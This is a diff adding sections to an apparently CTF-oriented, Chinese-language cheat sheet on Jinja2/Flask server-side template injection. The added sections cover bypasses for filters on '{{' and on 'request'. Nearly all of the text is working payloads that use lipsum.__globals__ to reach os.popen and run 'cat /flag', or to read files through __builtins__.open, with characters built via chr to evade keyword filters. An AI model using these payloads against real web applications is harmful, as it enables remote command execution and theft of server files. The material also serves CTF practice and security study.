@@ -226,3 +226,38 @@ cookie:a=__globals__;b=cat /flag
 ```
 ?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
 ```
+
+
+^
+## **过滤了{{**
+用{% 继续传参绕过
+```
+?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
+```
+
+
+
+^
+## **过滤了request**
+替换字符
+```
+lipsum.__globals__['__builtins__'].open('/flag').read()
+# 在__builtins__里面拿到chr，同样可以很方便的构造字符
+```
+```
+?name=
+{% set a=(()|select|string|list).pop(24) %}
+{
+   % set globals=(a,a,dict(globals=1)|join,a,a)|join %}
+{
+   % set init=(a,a,dict(init=1)|join,a,a)|join %}
+{
+   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %}
+{
+   % set a=(lipsum|attr(globals)).get(builtins) %}
+{
+   % set chr=a.chr %}
+{
+   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
+
+```
